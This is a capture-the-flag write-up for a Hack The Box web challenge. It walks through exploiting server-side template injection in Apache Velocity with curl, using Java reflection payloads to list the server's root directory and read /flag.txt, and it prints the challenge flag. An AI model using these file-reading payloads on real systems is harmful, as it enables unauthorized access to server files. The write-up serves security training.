# Labyrinth Linguist — Web

## 📌 CTF Overview

- **Platform:** Hack The Box
- **Category:** Web
- **Tools Used:** Terminal, cURL, Java Reflection, Apache Velocity
- **Vulnerability:** Server-Side Template Injection (SSTI)

## 🎯 Objective

Investigate the Labyrinth Linguist web application, identify the template injection vulnerability, explore the server environment, and retrieve the CTF flag.

## 🌐 Website Preview

The challenge features a mysterious interface where users can enter text to translate English into the fictional language Voxalith. By investigating how the application processes user input, it is possible to identify a server-side template injection vulnerability.



## 🔍 Vulnerability Explanation

The application uses Apache Velocity to process an HTML template. User-supplied input is inserted into the template before it is parsed and evaluated.

Because the input is interpreted as Velocity template syntax, an attacker can execute template expressions and access Java objects through the template context.

This vulnerability is known as **Server-Side Template Injection (SSTI)**.

By exploiting it in the authorized HTB challenge environment, I was able to:

- Confirm template expression evaluation.
- Access Java classes using reflection.
- List files and directories on the server.
- Locate `/flag.txt`.
- Read the flag using Java's `Scanner` class.

## 💻 Solution — Using Terminal Commands

### Step 1: Set the Target URL

```bash
export TARGET='http://154.57.164.66:38286'
```

### Step 2: Inspect the Website

```bash
curl -i "$TARGET/"
```

This command sends an HTTP request and displays the response headers and website content.

### Step 3: Confirm Server-Side Template Injection

```bash
curl -sG --data-urlencode 'text=#set($x=923*753)$x' "$TARGET/" \
| grep -o '695019'
```

**Expected output:**

```text
695019
```

The result confirms that the application evaluates the injected Velocity expression because `923 × 753 = 695019`.

### Step 4: List the Root Directory

```bash
curl -sG --data-urlencode 'text=#set($f=$name.class.forName("java.io.File").getConstructor($name.class).newInstance("/"))#set($a=$f.list())#set($i=0)#foreach($v in $a)$i:$v;#set($i=$i+1)#end' "$TARGET/" \
| grep -o '<h2 class="fire">.*</h2>'
```

The output reveals the server's root directory entries, including:

```text
19:entrypoint.sh;20:app;21:flag.txt;
```

This identifies `/flag.txt` as the target file.

### Step 5: Read the Flag

```bash
curl -sG --data-urlencode 'text=#set($f=$name.class.forName("java.io.File").getConstructor($name.class).newInstance("/flag.txt"))#set($s=$name.class.forName("java.util.Scanner").getConstructor($f.class).newInstance($f))$s.next()' "$TARGET/" \
| grep -o '<h2 class="fire">.*</h2>'
```

The command creates a Java `File` object, initializes a `Scanner` to read the file, and prints its contents in the HTML response.

### Step 6: Capture the Flag

**Retrieved flag:**

```text
HTB{...}
```

*Figure 2: Terminal investigation, SSTI exploitation, and successful flag retrieval.*

## ✅ Conclusion

This challenge provided hands-on experience with Server-Side Template Injection, Apache Velocity template evaluation, Java reflection, filesystem enumeration, and file reading through cURL-based requests.

The root cause was the unsafe evaluation of user-controlled input as part of a server-side template. A secure implementation should keep user input separate from template source code and avoid evaluating untrusted input as executable template syntax.

**Flag:** `HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!_867c5fb84acb1b37064cd913c156374d}`
